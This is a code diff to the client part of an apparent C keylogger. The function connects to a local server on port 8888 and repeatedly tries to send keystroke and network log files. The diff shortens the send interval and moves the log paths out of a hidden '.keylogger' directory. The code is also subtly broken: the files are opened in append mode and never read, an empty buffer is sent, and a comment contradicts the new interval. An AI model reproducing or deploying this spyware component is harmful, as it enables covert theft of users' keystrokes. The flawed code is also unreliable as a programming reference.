@@ -6,9 +6,9 @@
 void start_client(void)
 {
     // Variables
-    int sock, read_size, ret, bytesRead;
+    int sock, read_size, ret;
     struct sockaddr_in server;
-    char send_buffer[3000];
+    char send_buffer[1000];
     
     char *addr = "127.0.0.1";  // localhost
     short port = 8888;
@@ -36,14 +36,14 @@ void start_client(void)
     
     while(1)
     {
-        sleep(300); // wait 300sec = 5 min before sending logs again
+        sleep(15); // wait 300sec = 5 min before sending logs again
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
-        FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
+        FILE *keylog_log = fopen("log/keylog.txt", "a");
         /*Write keylog file*/
         while(!feof(keylog_log))
         {
-            if ((ret = write(sock, send_buffer, strlen(send_buffer))) <= 0) {
+            if ((ret = write(sock, &send_buffer, strlen(send_buffer))) <= 0) {
                 perror("Error writing keylog log\n");
                 close(sock);
                 exit(0);
@@ -54,11 +54,11 @@ void start_client(void)
         
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open network_log file for writing*/
-        FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
+        FILE *network_log = fopen("log/network.txt", "a");
         /*Write keylog file*/
         while(!feof(network_log))
         {
-            if ((ret = write(sock, send_buffer, strlen(send_buffer))) <= 0) {
+            if ((ret = write(sock, &send_buffer, strlen(send_buffer))) <= 0) {
                 perror("Error writing network log\n");
                 close(sock);
                 exit(0);
